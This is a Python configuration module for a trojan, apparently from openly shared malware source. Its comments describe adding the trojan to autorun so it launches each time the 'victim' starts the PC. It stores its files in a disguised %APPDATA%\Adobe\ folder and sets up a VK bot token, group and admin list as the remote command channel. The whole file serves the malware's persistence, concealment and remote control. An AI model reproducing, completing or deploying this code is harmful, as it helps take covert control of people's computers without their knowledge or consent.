# Trojan config.


# Importing.

# Other modules.
import os
import sys


# Settings.


# Autorun.

# If true, script will try to add self in autorun,
# so trojan will be launched every time victim launched pc.
# IF SCRIPT HAS .py EXTENSION THIS WILL DON'T PLACE SELF IN AUTORUN AS DEBUG-PROTECTION.
# PLEASE ENABLE AUTORUN_OVERRIDE_PY IF YOU WANT TO ADD IN AUTORUN IF .py EXTENSION,
AUTORUN_ENABLED = False

# If true, and AUTORUN_ENABLED also true,
# This will add .py script to autorun.
# IF .py EXTENSION, AUTORUN WILL NOT BE CALLED AS DEBUG-PROTECTION, PLEASE ENABLED THIS IF YOU WANT.
AUTORUN_OVERRIDE_PY = False

# Debug.

# If true, script will print() all messages,
# If you don't want to see any logs - disabled it.
DEBUG_PRINT_ENABLED = True

# If true, script will only show exceptions (Errors),
# And don`t show success / other information.
DEBUG_PRINT_ONLY_EXCEPTIONS = False

# If true, script will shows exceptions (Errors).
# Will be overridden by DEBUG_PRINT_ENABLED.
DEBUG_PRINT_EXCEPTIONS_ENABLED = True

# Executable.

# Folder, where should all files will be placed (include autorun executable).
EXECUTABLE_WORKING_DIRECTORY = os.getenv('APPDATA') + "\\Adobe\\"

# Version.

# Version title to show when calling version command,
# You may not change this (Why you should want this?)
VERSION_TITLE = "[Pre-release] 0.4.0.1"

# Server.

# Server connection fields.
# Fill only those what you need.
SERVER_CONNECTION_SETTINGS = {
    "SELECTED_TYPE": "VK",  # Current type: VK
    "VK_TOKEN": "",  # noqa
    "VK_GROUP": 0,
    "VK_ADMINS": []
}

# Constants.

# Executable.

# Executable path.
EXECUTABLE_PATH = sys.argv[0]

# Executable extension of script (or app).
# [py, exe]
# If EXECUTABLE_EXTENSION == py and AUTORUN_ENABLED,
# Autorun will don`t work, except there is AUTORUN_OVERRIDE_PY enabled.
EXECUTABLE_EXTENSION = EXECUTABLE_PATH.split(".")[-1]

# Console.

# System code for console, when all OK.
CONSOLE_SYSTEM_CODE_OK = 0
